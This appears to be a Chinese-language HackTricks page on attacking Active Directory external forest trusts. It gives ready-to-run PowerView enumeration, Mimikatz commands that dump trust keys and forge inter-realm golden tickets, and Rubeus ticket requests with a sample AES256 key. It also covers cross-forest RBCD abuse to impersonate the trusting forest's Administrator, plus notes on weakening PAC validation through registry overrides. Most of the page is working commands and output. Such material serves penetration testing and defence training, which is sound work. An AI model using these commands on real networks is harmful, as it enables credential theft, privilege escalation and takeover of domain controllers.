# 外部林域 - 单向（入站）或双向

{{#include ../../banners/hacktricks-training.md}}

在本场景中，外部域信任你（或双方互相信任），因此你可以对其获得某种访问权限。

## 枚举

首先，你需要**枚举**该**信任**：
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` 让你快速判断跨林滥用路径 (RBCD, SIDHistory) 是否有可能在不需额外前提的情况下奏效。

在先前的枚举中发现用户 **`crossuser`** 属于 **`External Admins`** 组，该组在 **外部域的 DC** 内具有 **Admin access**。

## 初始访问

如果你 **couldn't** 在另一个域中找到你的用户具有任何 **special** 访问权限，你仍然可以回到 AD Methodology 并尝试从 **privesc from an unprivileged user**（例如 kerberoasting 等方法）：

你可以使用 **Powerview functions** 来 **枚举** **另一个域**，使用 `-Domain` param 像下面这样：
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## 冒充

### 登录

使用常规方法并利用对外部域具有访问权限的用户凭据，您应该能够访问：
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Abuse

你也可以在林信任中滥用 [**SID History**](sid-history-injection.md)。

如果用户被**从一个林迁移到另一个林**并且**SID Filtering 未启用**，则可能**添加来自另一个林的 SID**，并且该 **SID** 将在**跨越信任**进行身份验证时**被添加**到**用户的 token**。

> [!WARNING]
> 提醒：你可以使用以下命令获取签名密钥
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

你可以**使用** **受信任的** 密钥对**伪装为当前域用户的 TGT**进行**签名**。
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### 完整方式：模拟用户
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD — 当你在信任林中控制机器账户时 (no SID filtering / selective auth)

如果你的 foreign principal (FSP) 使你成为一个可以在信任林中写入 computer objects 的组的成员（例如 `Account Operators`、custom provisioning group），你可以在该林的目标主机上配置 **Resource-Based Constrained Delegation** 并冒充那里的任意用户：
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
这仅在 **SelectiveAuthentication 被禁用** 并且 **SID filtering** 未剥离你所控制的 SID 时有效。它是一条快速的横向通道，可以绕过 SIDHistory 伪造，并且常在信任审查中被忽略。

### PAC 验证加固

针对 **CVE-2024-26248**/**CVE-2024-29056** 的 PAC 签名验证更新对跨林票证增加了签名强制。在 **Compatibility mode** 下，伪造的跨域 PAC/SIDHistory/S4U 路径在未打补丁的 DCs 上仍可能生效。在 **Enforcement mode** 下，未经签名或被篡改的穿越 forest trust 的 PAC 数据将被拒绝，除非你也拥有目标 forest trust 的密钥。注册表覆盖（`PacSignatureValidationLevel`, `CrossDomainFilteringLevel`）在仍可用时可以削弱此限制。

## 参考

- [Microsoft KB5037754 – PAC validation changes for CVE-2024-26248 & CVE-2024-29056](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [MS-PAC spec – SID filtering & claims transformation details](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
